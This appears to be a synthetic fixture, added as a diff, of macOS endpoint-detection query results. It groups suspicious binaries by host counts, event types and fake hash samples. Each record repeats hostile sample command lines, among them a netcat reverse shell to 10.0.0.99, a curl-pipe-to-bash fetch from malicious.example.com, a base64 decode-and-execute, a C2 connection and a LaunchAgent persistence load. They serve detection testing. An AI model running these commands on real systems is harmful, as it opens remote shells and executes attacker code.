@@ -1,0 +1,112 @@
+[
+  {
+    "AffectedHostnames": "[\"prod-mac-build-01.contoso.local\",\"finance-imac-01.contoso.local\",\"ceo-mbp.contoso.local\",\"jdoe-mbp.contoso.local\",\"asmith-macstudio.contoso.local\",\"fin-mbp-finance.contoso.local\",\"mkt-mbp-02.contoso.local\",\"vip-mbp-legal.contoso.local\",\"intern-mbp-01.contoso.local\"]",
+    "BinaryPath": "/usr/bin/osascript",
+    "DistinctHosts": "9",
+    "EventTypes": "[\"UnifiedLog\",\"USB\",\"Process\",\"UsbBlock\",\"Gatekeeper\",\"FileSystem\",\"Click\",\"ProcessPrevented\",\"ProcessDenied\"]",
+    "HitCount": "21",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"x2f14km3p\",\"2u5wqqulkm\",\"tdwbkkmg\",\"pzzu9cvows01\",\"q8iv381n35m1\"]",
+    "SampleCmdLines": "[\"openssl s_client -connect c2.example.com:443\",\"curl -fsSL http://malicious.example.com/payload.sh | bash\",\"bash -c 'echo dGVzdA== | base64 -d | sh'\",\"sudo launchctl load /Library/LaunchAgents/com.evil.plist\",\"nc -e /bin/bash 10.0.0.99 4444\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"ceo-mbp.contoso.local\",\"vip-mbp-legal.contoso.local\",\"asmith-macstudio.contoso.local\",\"finance-imac-01.contoso.local\",\"fin-mbp-finance.contoso.local\",\"dev-mbp-eng-01.contoso.local\",\"intern-mbp-01.contoso.local\",\"prod-mac-build-01.contoso.local\"]",
+    "BinaryPath": "/usr/bin/python3",
+    "DistinctHosts": "8",
+    "EventTypes": "[\"UsbBlock\",\"USB\",\"ProcessDenied\",\"UnifiedLog\",\"Download\",\"FileSystem\",\"Keylog\",\"MRT\",\"ProcessPrevented\",\"Process\"]",
+    "HitCount": "20",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"22jmjnebqo24zxwctcw9j\",\"n9cm7zcgbzmt\",\"jlldaviv9\",\"vxehdbpxb0sa\",\"61bfw0mhdhgt0o\"]",
+    "SampleCmdLines": "[\"python3 -c 'import os; os.system(\\\"id\\\")'\",\"sudo launchctl load /Library/LaunchAgents/com.evil.plist\",\"nc -e /bin/bash 10.0.0.99 4444\",\"osascript -e 'do shell script \\\"whoami\\\"'\",\"openssl s_client -connect c2.example.com:443\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"prod-mac-build-01.contoso.local\",\"finance-imac-01.contoso.local\",\"vip-mbp-legal.contoso.local\",\"asmith-macstudio.contoso.local\",\"dev-mbp-eng-01.contoso.local\",\"intern-mbp-01.contoso.local\",\"jdoe-mbp.contoso.local\",\"fin-mbp-finance.contoso.local\",\"mkt-mbp-02.contoso.local\"]",
+    "BinaryPath": "/usr/bin/openssl",
+    "DistinctHosts": "9",
+    "EventTypes": "[\"ProcessPrevented\",\"Process\",\"MRT\",\"ProcessDenied\",\"Keylog\",\"Gatekeeper\",\"FileSystem\",\"Download\",\"UnifiedLog\"]",
+    "HitCount": "17",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"j19w0xpv40\",\"5b4v5yfzmdpte5g1u\",\"o4bjzm937onbm\",\"poyntbbp17gew8w14f3x9rn\",\"qp0r6eyxe7rtmre5sslllu\"]",
+    "SampleCmdLines": "[\"openssl s_client -connect c2.example.com:443\",\"sudo launchctl load /Library/LaunchAgents/com.evil.plist\",\"osascript -e 'do shell script \\\"whoami\\\"'\",\"python3 -c 'import os; os.system(\\\"id\\\")'\",\"curl -fsSL http://malicious.example.com/payload.sh | bash\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"mkt-mbp-02.contoso.local\",\"dev-mbp-eng-01.contoso.local\",\"finance-imac-01.contoso.local\",\"intern-mbp-01.contoso.local\",\"jdoe-mbp.contoso.local\",\"asmith-macstudio.contoso.local\",\"ceo-mbp.contoso.local\",\"fin-mbp-finance.contoso.local\",\"vip-mbp-legal.contoso.local\"]",
+    "BinaryPath": "/usr/local/bin/node",
+    "DistinctHosts": "9",
+    "EventTypes": "[\"UnifiedLog\",\"Keylog\",\"UsbBlock\",\"MRT\",\"Gatekeeper\",\"Click\",\"ProcessPrevented\",\"ProcessDenied\",\"USB\"]",
+    "HitCount": "17",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"cppsp35p41bw46j\",\"2qfs4iyd\",\"2eub09ga1z6\",\"df3ui5r22cnly51y0dl\",\"tx2u718riai\"]",
+    "SampleCmdLines": "[\"python3 -c 'import os; os.system(\\\"id\\\")'\",\"nc -e /bin/bash 10.0.0.99 4444\",\"openssl s_client -connect c2.example.com:443\",\"bash -c 'echo dGVzdA== | base64 -d | sh'\",\"osascript -e 'do shell script \\\"whoami\\\"'\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"mkt-mbp-02.contoso.local\",\"ceo-mbp.contoso.local\",\"fin-mbp-finance.contoso.local\",\"asmith-macstudio.contoso.local\",\"intern-mbp-01.contoso.local\",\"jdoe-mbp.contoso.local\",\"dev-mbp-eng-01.contoso.local\"]",
+    "BinaryPath": "/usr/bin/curl",
+    "DistinctHosts": "7",
+    "EventTypes": "[\"MRT\",\"FileSystem\",\"Keylog\",\"ProcessPrevented\",\"UsbBlock\",\"Process\",\"Download\"]",
+    "HitCount": "13",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"z0ugishto\",\"r95ezpr7en\",\"ps71wc873p9tck\",\"pdite2rwgvs6kirfznm\",\"m3x5cams7at\"]",
+    "SampleCmdLines": "[\"sh /tmp/payload.sh\",\"bash -c 'echo dGVzdA== | base64 -d | sh'\",\"curl -fsSL http://malicious.example.com/payload.sh | bash\",\"nc -e /bin/bash 10.0.0.99 4444\",\"osascript -e 'do shell script \\\"whoami\\\"'\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"mkt-mbp-02.contoso.local\",\"jdoe-mbp.contoso.local\",\"dev-mbp-eng-01.contoso.local\",\"finance-imac-01.contoso.local\",\"vip-mbp-legal.contoso.local\",\"asmith-macstudio.contoso.local\",\"fin-mbp-finance.contoso.local\"]",
+    "BinaryPath": "/usr/bin/nc",
+    "DistinctHosts": "7",
+    "EventTypes": "[\"UsbBlock\",\"ProcessDenied\",\"Download\",\"Gatekeeper\",\"MRT\",\"FileSystem\",\"UnifiedLog\",\"Keylog\",\"Process\",\"Click\"]",
+    "HitCount": "13",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"u212g1ua\",\"08byrtggiztxho6gg0jxlgq\",\"2qedpoj4\",\"tativyeu7wbypjreb3sa1o\",\"qa3emrb1\"]",
+    "SampleCmdLines": "[\"curl -fsSL http://malicious.example.com/payload.sh | bash\",\"nc -e /bin/bash 10.0.0.99 4444\",\"bash -c 'echo dGVzdA== | base64 -d | sh'\",\"osascript -e 'do shell script \\\"whoami\\\"'\",\"sh /tmp/payload.sh\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"mkt-mbp-02.contoso.local\",\"vip-mbp-legal.contoso.local\",\"asmith-macstudio.contoso.local\",\"jdoe-mbp.contoso.local\",\"intern-mbp-01.contoso.local\",\"dev-mbp-eng-01.contoso.local\",\"ceo-mbp.contoso.local\",\"finance-imac-01.contoso.local\",\"fin-mbp-finance.contoso.local\"]",
+    "BinaryPath": "/tmp/implant",
+    "DistinctHosts": "9",
+    "EventTypes": "[\"Gatekeeper\",\"UsbBlock\",\"Process\",\"MRT\",\"FileSystem\",\"ProcessDenied\",\"Keylog\",\"Download\"]",
+    "HitCount": "12",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"n1afz1tv09l64pq71e\",\"pwxb0wcrrh4\",\"upfwk9ed5iduf0a1r7uey3e\",\"pf4sdji0ukl2bq4zegs\",\"e8h99na288j5vlkmdirkgb\"]",
+    "SampleCmdLines": "[\"sh /tmp/payload.sh\",\"nc -e /bin/bash 10.0.0.99 4444\",\"curl -fsSL http://malicious.example.com/payload.sh | bash\",\"python3 -c 'import os; os.system(\\\"id\\\")'\",\"openssl s_client -connect c2.example.com:443\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"jdoe-mbp.contoso.local\",\"fin-mbp-finance.contoso.local\",\"ceo-mbp.contoso.local\",\"mkt-mbp-02.contoso.local\",\"asmith-macstudio.contoso.local\"]",
+    "BinaryPath": "/bin/bash",
+    "DistinctHosts": "5",
+    "EventTypes": "[\"UnifiedLog\",\"MRT\",\"Download\",\"UsbBlock\",\"Process\",\"Click\",\"ProcessPrevented\"]",
+    "HitCount": "10",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"ty9rghz74d8xengj\",\"19slvswvgzlsblhi\",\"wcgjd6xo66n4i54cos1p\",\"xvqea1x98xv600v4hai\",\"l3xfh7h6k6acxz9j1jl\"]",
+    "SampleCmdLines": "[\"nc -e /bin/bash 10.0.0.99 4444\",\"python3 -c 'import os; os.system(\\\"id\\\")'\",\"sh /tmp/payload.sh\",\"curl -fsSL http://malicious.example.com/payload.sh | bash\",\"osascript -e 'do shell script \\\"whoami\\\"'\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"mkt-mbp-02.contoso.local\",\"ceo-mbp.contoso.local\",\"prod-mac-build-01.contoso.local\",\"dev-mbp-eng-01.contoso.local\",\"jdoe-mbp.contoso.local\",\"fin-mbp-finance.contoso.local\",\"intern-mbp-01.contoso.local\"]",
+    "BinaryPath": "/var/folders/zz/badlib.dylib",
+    "DistinctHosts": "7",
+    "EventTypes": "[\"Gatekeeper\",\"ProcessDenied\",\"Download\",\"UnifiedLog\",\"MRT\",\"Keylog\",\"Click\"]",
+    "HitCount": "10",
+    "MaxSeverity": "Medium",
+    "SHA256Samples": "[\"b8dthc5w\",\"7knjoui4zc0b\",\"pbxmtlhddbrg\",\"29nomjnbdsct\",\"jqz93pkehvr2zke2b2bl\"]",
+    "SampleCmdLines": "[\"curl -fsSL http://malicious.example.com/payload.sh | bash\",\"bash -c 'echo dGVzdA== | base64 -d | sh'\",\"nc -e /bin/bash 10.0.0.99 4444\",\"python3 -c 'import os; os.system(\\\"id\\\")'\",\"openssl s_client -connect c2.example.com:443\"]",
+    "TableName": "PrimaryResult"
+  },
+  {
+    "AffectedHostnames": "[\"intern-mbp-01.contoso.local\",\"vip-mbp-legal.contoso.local\",\"jdoe-mbp.contoso.local\",\"dev-mbp-eng-01.contoso.local\",\"fin-mbp-finance.contoso.local\"]",
+    "BinaryPath": "/Applications/Bad App.app/Contents/MacOS/badbin",
+    "DistinctHosts": "5",
+    "EventTypes": "[\"Process\",\"Click\",\"Keylog\",\"USB\"]",
+    "HitCount": "6",
+    "MaxSeverity": "Low",
+    "SHA256Samples": "[\"ze3xygrlawp4t03yw0twpa\",\"x0rh0m6ukik\",\"t2xq0mwqm71\",\"ayvh7l1imlc\",\"uh167i6k1cz8th2hft\"]",
+    "SampleCmdLines": "[\"python3 -c 'import os; os.system(\\\"id\\\")'\",\"curl -fsSL http://malicious.example.com/payload.sh | bash\",\"nc -e /bin/bash 10.0.0.99 4444\",\"openssl s_client -connect c2.example.com:443\",\"sh /tmp/payload.sh\"]",
+    "TableName": "PrimaryResult"
+  }
+]
